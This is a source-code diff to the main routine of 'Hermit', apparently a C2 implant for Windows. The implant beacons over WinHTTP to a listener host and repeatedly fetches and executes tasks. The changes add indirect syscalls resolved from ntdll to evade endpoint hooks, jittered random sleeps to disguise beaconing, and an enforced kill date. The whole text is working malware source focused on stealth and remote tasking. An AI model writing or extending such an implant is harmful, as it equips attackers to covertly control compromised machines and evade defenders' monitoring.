@@ -6,6 +6,7 @@ namespace Hermit
 		HINSTANCE       hInstance,
 		INT 			nCmdShow,
 		LPCWSTR			lpPayloadType,
+		BOOL			bIndirectSyscalls,
 		LPCWSTR			lpProtocol,
 		LPCWSTR 		lpHost,
 		INTERNET_PORT 	nPort,
@@ -33,15 +34,17 @@ namespace Hermit
             return;
         }
 
-		State::PState pState = new State::State;
+		State::PSTATE pState = new State::STATE;
 
 		pState->pTeb 				= NtCurrentTeb();
 		pState->hNTDLL				= hNTDLL;
 		pState->hWinHTTPDLL			= hWinHTTPDLL;
 		pState->pProcs 				= Procs::FindProcs(hNTDLL, hWinHTTPDLL);
+		pState->pSyscalls			= Syscalls::FindSyscalls(hNTDLL);
 		pState->hInstance 			= hInstance;
 		pState->nCmdShow 			= nCmdShow;
 		pState->lpPayloadType 		= lpPayloadType;
+		pState->bIndirectSyscalls	= bIndirectSyscalls;
 		pState->lpListenerProto 	= lpProtocol;
 		pState->lpListenerHost 		= lpHost;
 		pState->nListenerPort 		= nPort;
@@ -68,28 +71,28 @@ namespace Hermit
 		Handler::HTTPInit(pState);
 		if (pState->hSession == NULL || pState->hConnect == NULL)
 		{
-			goto exit;
+			State::Free(pState);
+			return;
 		}
 
 		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);
 
-		// Check in
+		// Check-In
 		do
 		{
-			Sleep(pState->nSleep * 1000);
+			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
 
 			if (Handler::CheckIn(pState, wInfoJson))
 				break;
 		} while (1 == 1);
 
-		// Get/Execute/Send tasks
+		// Tasks
 		do
 		{
-			Sleep(pState->nSleep * 1000);
+			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
 
-			// Check if it reached the KillDate
-			// if (reachedKillDate(pState))
-			// 	break;
+			if (Handler::IsKillDateReached(pState->nKillDate))
+				pState->bQuit = TRUE;
 
 			Handler::Task(pState);
 
@@ -97,7 +100,6 @@ namespace Hermit
 			// Handler::Socket(pState);
 		} while (!pState->bQuit);
 
-	exit:
 		State::Free(pState);
 		return;
 	}
